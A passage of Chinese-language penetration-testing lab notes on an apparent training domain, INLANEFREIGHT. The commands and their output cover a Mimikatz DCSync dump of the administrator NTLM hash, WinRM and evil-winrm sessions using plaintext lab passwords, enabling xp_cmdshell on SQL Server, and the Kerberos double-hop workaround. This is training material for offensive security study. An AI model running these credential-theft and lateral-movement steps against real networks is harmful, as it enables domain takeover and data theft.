<h3 id="使用-runas-exe"><a href="#使用-runas-exe" class="headerlink" title="使用 runas.exe"></a>使用 runas.exe</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Microsoft Windows [Version <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">17763</span>.<span class="hljs-number">107</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><span class="hljs-function"></span><br><span class="hljs-function">C:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt;<span class="hljs-title">runas</span> /<span class="hljs-title">netonly</span> /<span class="hljs-title">user:INLANEFREIGHT</span>\<span class="hljs-title">adunn</span> <span class="hljs-title">powershell</span></span><br><span class="hljs-function"><span class="hljs-title">Enter</span> <span class="hljs-title">the</span> <span class="hljs-title">password</span> <span class="hljs-title">for</span> <span class="hljs-title">INLANEFREIGHT</span>\<span class="hljs-title">adunn</span>:</span><br><span class="hljs-function"><span class="hljs-title">Attempting</span> <span class="hljs-title">to</span> <span class="hljs-title">start</span> <span class="hljs-title">powershell</span> <span class="hljs-title">as</span> <span class="hljs-title">user</span> &quot;<span class="hljs-title">INLANEFREIGHT</span>\<span class="hljs-title">adunn</span>&quot; ...</span><br></code></pre></td></tr></table></figure>

<h3 id="使用-Mimikatz-执行攻击"><a href="#使用-Mimikatz-执行攻击" class="headerlink" title="使用 Mimikatz 执行攻击"></a>使用 Mimikatz 执行攻击</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\mimikatz.exe<br><br>  .<span class="hljs-comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br> .<span class="hljs-comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br> <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br>  <span class="hljs-string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/<br><br>mimikatz <span class="hljs-comment"># privilege::debug</span><br>Privilege <span class="hljs-string">&#x27;20&#x27;</span> OK<br><br>mimikatz <span class="hljs-comment"># lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</span><br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain<br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server<br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;INLANEFREIGHT\administrator&#x27;</span> will be the user account<br>[<span class="hljs-type">rpc</span>] Service  : ldap<br>[<span class="hljs-type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>)<br><br>Object RDN           : Administrator<br><br>** SAM ACCOUNT **<br><br>SAM Username         : administrator<br>User Principal Name  : administrator@inlanefreight.local<br>Account <span class="hljs-built_in">Type</span>         : <span class="hljs-number">30000000</span> ( USER_OBJECT )<br>User Account Control : <span class="hljs-number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )<br>Account expiration   :<br>Password last change : <span class="hljs-number">10</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2021</span> <span class="hljs-number">6</span>:<span class="hljs-number">49</span>:<span class="hljs-number">32</span> AM<br>Object Security ID   : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-500</span><br>Object Relative ID   : <span class="hljs-number">500</span><br><br>Credentials:<br>  Hash NTLM: <span class="hljs-number">88</span>ad09182de639ccc6579eb0849751cf<br><br>Supplemental Credentials:<br>* Primary:NTLM<span class="hljs-literal">-Strong-NTOWF</span> *<br>    Random Value : <span class="hljs-number">4625</span>fd0c31368ff4c255a3b876eaac3d<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h1 id="Stacking-The-Deck-积累特权访问权限"><a href="#Stacking-The-Deck-积累特权访问权限" class="headerlink" title="Stacking The Deck(积累特权访问权限)"></a>Stacking The Deck(积累特权访问权限)</h1><h2 id="特权访问"><a href="#特权访问" class="headerlink" title="特权访问"></a>特权访问</h2><ul>
<li><p><code>Pass-the-Hash</code> 攻击，通过 SMB 协议进行身份验证</p>
</li>
<li><p><code>Remote Desktop Protocol</code> ( <code>RDP</code> ) - 是一种远程访问&#x2F;管理协议，使我们能够通过图形用户界面访问目标主机</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2">PowerShell Remoting</a>（也称为 PSRemoting 或 Windows 远程管理 (WinRM) 访问）是一种远程访问协议，允许我们在远程主机上运行命令或进入交互式命令行会话，使用 PowerShell 实现</p>
</li>
<li><p><code>MSSQL Server</code> - 拥有 SQL Server 实例 sysadmin 权限的账户可以远程登录该实例，并对数据库执行查询。此访问权限可用于通过多种方法在 SQL Server 服务账户的上下文中运行操作系统命令。</p>
</li>
</ul>
<h3 id="枚举远程桌面用户组"><a href="#枚举远程桌面用户组" class="headerlink" title="枚举远程桌面用户组"></a>枚举远程桌面用户组</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-NetLocalGroupMember</span> <span class="hljs-literal">-ComputerName</span> ACADEMY<span class="hljs-literal">-EA-MS01</span> <span class="hljs-literal">-GroupName</span> <span class="hljs-string">&quot;Remote Desktop Users&quot;</span><br><br>ComputerName : ACADEMY<span class="hljs-literal">-EA-MS01</span><br>GroupName    : Remote Desktop Users<br>MemberName   : INLANEFREIGHT\Domain Users<br>SID          : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-513</span><br>IsGroup      : True<br>IsDomain     : UNKNOWN<br></code></pre></td></tr></table></figure>

<h3 id="枚举远程管理用户组"><a href="#枚举远程管理用户组" class="headerlink" title="枚举远程管理用户组"></a>枚举远程管理用户组</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-NetLocalGroupMember</span> <span class="hljs-literal">-ComputerName</span> ACADEMY<span class="hljs-literal">-EA-MS01</span> <span class="hljs-literal">-GroupName</span> <span class="hljs-string">&quot;Remote Management Users&quot;</span><br><br>ComputerName : ACADEMY<span class="hljs-literal">-EA-MS01</span><br>GroupName    : Remote Management Users<br>MemberName   : INLANEFREIGHT\forend<br>SID          : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-5614</span><br>IsGroup      : False<br>IsDomain     : UNKNOWN<br></code></pre></td></tr></table></figure>

<h3 id="从-Windows-Linux-建立-WinRM-会话"><a href="#从-Windows-Linux-建立-WinRM-会话" class="headerlink" title="从 Windows&#x2F;Linux 建立 WinRM 会话"></a>从 Windows&#x2F;Linux 建立 WinRM 会话</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;Klmcargo2&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$cred</span> = <span class="hljs-built_in">new-object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&quot;INLANEFREIGHT\forend&quot;</span>, <span class="hljs-variable">$password</span>)<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">-ComputerName</span> ACADEMY<span class="hljs-literal">-EA-MS01</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br><br>[<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">MS01</span>]: <span class="hljs-built_in">PS</span> C:\Users\forend\Documents&gt; hostname<br>ACADEMY<span class="hljs-literal">-EA-MS01</span><br>[<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">EA</span>-<span class="hljs-type">MS01</span>]: <span class="hljs-built_in">PS</span> C:\Users\forend\Documents&gt; <span class="hljs-built_in">Exit-PSSession</span><br><span class="hljs-built_in">PS</span> C:\htb&gt; <br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend<br><br>Enter Password: <br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents&gt; hostname<br>ACADEMY-EA-MS01<br></code></pre></td></tr></table></figure>

<h3 id="SQL-Server-管理员"><a href="#SQL-Server-管理员" class="headerlink" title="SQL Server 管理员"></a>SQL Server 管理员</h3><h4 id="使用-PowerUpSQL-枚举-MSSQL-实例"><a href="#使用-PowerUpSQL-枚举-MSSQL-实例" class="headerlink" title="使用 PowerUpSQL 枚举 MSSQL 实例"></a>使用 PowerUpSQL 枚举 MSSQL 实例</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">cd</span> .\PowerUpSQL\<br><span class="hljs-built_in">PS</span> C:\htb&gt;  <span class="hljs-built_in">Import-Module</span> .\PowerUpSQL.ps1<br><span class="hljs-built_in">PS</span> C:\htb&gt;  <span class="hljs-built_in">Get-SQLInstanceDomain</span><br><br>ComputerName     : ACADEMY<span class="hljs-literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL<br>Instance         : ACADEMY<span class="hljs-literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL,<span class="hljs-number">1433</span><br>DomainAccountSid : <span class="hljs-number">1500000521000170152142291832437223174127203170152400</span><br>DomainAccount    : damundsen<br>DomainAccountCn  : Dana Amundsen<br>Service          : MSSQLSvc<br>Spn              : MSSQLSvc/ACADEMY<span class="hljs-literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL:<span class="hljs-number">1433</span><br>LastLogon        : <span class="hljs-number">4</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">59</span> AM<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt;  <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;172.16.5.150,1433&quot;</span> <span class="hljs-literal">-username</span> <span class="hljs-string">&quot;inlanefreight\damundsen&quot;</span> <span class="hljs-literal">-password</span> <span class="hljs-string">&quot;SQL1234!&quot;</span> <span class="hljs-literal">-query</span> <span class="hljs-string">&#x27;Select @@version&#x27;</span><br><br>VERBOSE: <span class="hljs-number">172.16</span>.<span class="hljs-number">5.150</span>,<span class="hljs-number">1433</span> : Connection Success.<br><br>Column1<br><span class="hljs-literal">-------</span><br>Microsoft SQL Server <span class="hljs-number">2017</span> (RTM) - <span class="hljs-number">14.0</span>.<span class="hljs-number">1000.169</span> (X64) ...<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth<br>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192<br>[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to <span class="hljs-string">&#x27;master&#x27;</span>.<br>[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.<br>[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) <br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br></code></pre></td></tr></table></figure>

<h4 id="使用-xp-cmdshell-枚举系统中的权限"><a href="#使用-xp-cmdshell-枚举系统中的权限" class="headerlink" title="使用 xp_cmdshell 枚举系统中的权限"></a>使用 xp_cmdshell 枚举系统中的权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">SQL&gt; enable_xp_cmdshell<br><br>[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option <span class="hljs-string">&#x27;show advanced options&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.<br>[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">xp_cmdshell <span class="hljs-built_in">whoami</span> /priv<br>output                                                                             <br><br>--------------------------------------------------------------------------------   <br><br>NULL                                                                               <br><br>PRIVILEGES INFORMATION                                                             <br><br>----------------------                                                             <br><br>NULL                                                                               <br><br>Privilege Name                Description                               State      <br><br>============================= ========================================= ========   <br><br>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   <br><br>SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="hljs-keyword">for</span> a process        Disabled   <br><br>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    <br><br>SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    <br><br>SeImpersonatePrivilege        Impersonate a client after authentication Enabled    <br><br>SeCreateGlobalPrivilege       Create global objects                     Enabled    <br><br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span>            Disabled   <br><br>NULL       <br></code></pre></td></tr></table></figure>

<h2 id="Kerberos“双跳”问题"><a href="#Kerberos“双跳”问题" class="headerlink" title="Kerberos“双跳”问题"></a>Kerberos“双跳”问题</h2><p>“双跳”问题在使用 WinRM&#x2F;Powershell 时常出现，因为默认的身份验证机制仅提供访问特定资源的票据。这可能导致在尝试进行横向移动或从远程 shell 访问文件共享时出现问题。在这种情况下，使用的用户账户有权执行操作但被拒绝访问。获取 shell 最常见的方式是攻击目标主机上的应用程序或使用 PSExec 等工具和凭据。在这两种场景中，初始身份验证很可能通过 SMB 或 LDAP 进行，这意味着用户的 NTLM 哈希会被存储在内存中。有时我们拥有一组凭据，并被限制使用特定身份验证方法，如 WinRM，或出于多种原因更倾向于使用 WinRM。</p>
<h4 id="PSCredential-对象"><a href="#PSCredential-对象" class="headerlink" title="PSCredential 对象"></a>PSCredential 对象</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="hljs-built_in">import-module</span> .\PowerView.ps1<br><br>|S<span class="hljs-literal">-chain</span>|-&lt;&gt;<span class="hljs-literal">-127</span>.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">9051</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-172</span>.<span class="hljs-number">16.8</span>.<span class="hljs-number">50</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-OK</span><br>|S<span class="hljs-literal">-chain</span>|-&lt;&gt;<span class="hljs-literal">-127</span>.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">9051</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-172</span>.<span class="hljs-number">16.8</span>.<span class="hljs-number">50</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-OK</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="hljs-built_in">get-domainuser</span> <span class="hljs-literal">-spn</span><br>Exception calling <span class="hljs-string">&quot;FindAll&quot;</span> with <span class="hljs-string">&quot;0&quot;</span> argument(s): <span class="hljs-string">&quot;An operations error occurred.</span><br><span class="hljs-string">&quot;</span><br>At C:\Users\backupadm\Documents\PowerView.ps1:<span class="hljs-number">5253</span> char:<span class="hljs-number">20</span><br>+             <span class="hljs-keyword">else</span> &#123; <span class="hljs-variable">$Results</span> = <span class="hljs-variable">$UserSearcher</span>.FindAll() &#125;<br>+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException<br>    + FullyQualifiedErrorId : DirectoryServicesCOMException<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\backupadm\Documents&gt; klist<br><br>Current LogonId is <span class="hljs-number">0</span>:<span class="hljs-number">0</span>x57f8a<br><br>Cached Tickets: (<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#0&gt; Client: backupadm @ INLANEFREIGHT.LOCAL</span><br>    Server: academy<span class="hljs-literal">-aen-ms0</span><span class="hljs-variable">$</span> <span class="hljs-selector-tag">@</span><br>    KerbTicket Encryption <span class="hljs-built_in">Type</span>: AES<span class="hljs-literal">-256-CTS-HMAC-SHA1-96</span><br>    Ticket Flags <span class="hljs-number">0</span>xa10000 -&gt; renewable pre_authent name_canonicalize<br>    <span class="hljs-built_in">Start</span> Time: <span class="hljs-number">6</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">31</span>:<span class="hljs-number">53</span> (local)<br>    <span class="hljs-keyword">End</span> Time:   <span class="hljs-number">6</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">46</span>:<span class="hljs-number">53</span> (local)<br>    Renew Time: <span class="hljs-number">7</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">31</span>:<span class="hljs-number">18</span> (local)<br>    Session Key <span class="hljs-built_in">Type</span>: AES<span class="hljs-literal">-256-CTS-HMAC-SHA1-96</span><br>    Cache Flags: <span class="hljs-number">0</span>x4 -&gt; S4U<br>    Kdc Called: DC01.INLANEFREIGHT.LOCAL<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="hljs-variable">$SecPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;!qazXSW@&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br>|S<span class="hljs-literal">-chain</span>|-&lt;&gt;<span class="hljs-literal">-127</span>.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">9051</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-172</span>.<span class="hljs-number">16.8</span>.<span class="hljs-number">50</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-OK</span><br>|S<span class="hljs-literal">-chain</span>|-&lt;&gt;<span class="hljs-literal">-127</span>.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">9051</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-172</span>.<span class="hljs-number">16.8</span>.<span class="hljs-number">50</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-OK</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\backupadm\Documents&gt;  <span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;INLANEFREIGHT\backupadm&#x27;</span>, <span class="hljs-variable">$SecPassword</span>)<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="hljs-built_in">get-domainuser</span> <span class="hljs-literal">-spn</span> <span class="hljs-literal">-credential</span> <span class="hljs-variable">$Cred</span> | <span class="hljs-built_in">select</span> samaccountname<br><br>|S<span class="hljs-literal">-chain</span>|-&lt;&gt;<span class="hljs-literal">-127</span>.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">9051</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-172</span>.<span class="hljs-number">16.8</span>.<span class="hljs-number">50</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-OK</span><br>|S<span class="hljs-literal">-chain</span>|-&lt;&gt;<span class="hljs-literal">-127</span>.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">9051</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-172</span>.<span class="hljs-number">16.8</span>.<span class="hljs-number">50</span>:<span class="hljs-number">5985</span>-&lt;&gt;&lt;&gt;<span class="hljs-literal">-OK</span><br><br>samaccountname<br><span class="hljs-literal">--------------</span><br>azureconnect<br>backupjob<br>krbtgt<br>mssqlsvc<br>sqltest<br>sqlqa<br>sqldev<br>mssqladm<br>svc_sql<br>sqlprod<br>sapsso<br>sapvc<br>vmwarescvc<br></code></pre></td></tr></table></figure>

<p>如果我们通过 RDP 连接到同一主机，打开 CMD 命令提示符并输入 <code>klist</code> ，我们会看到已缓存了必要的票据，可以直接与域控制器交互，而无需担心双跳问题。这是因为我们的密码存储在内存中，因此可以随每个请求一起发送。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">htb</span>&gt; <span class="hljs-title">klist</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Current</span> <span class="hljs-title">LogonId</span> <span class="hljs-title">is</span> 0:0<span class="hljs-title">x1e5b8b</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Cached</span> <span class="hljs-title">Tickets</span>: (4)</span><br><span class="hljs-function"></span><br><span class="hljs-function">#0&gt;     <span class="hljs-title">Client</span>: <span class="hljs-title">backupadm</span> @ <span class="hljs-title">INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">Server</span>: <span class="hljs-title">krbtgt</span>/<span class="hljs-title">INLANEFREIGHT.LOCAL</span> @ <span class="hljs-title">INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">KerbTicket</span> <span class="hljs-title">Encryption</span> <span class="hljs-title">Type</span>: <span class="hljs-title">AES</span>-256-<span class="hljs-title">CTS</span>-<span class="hljs-title">HMAC</span>-<span 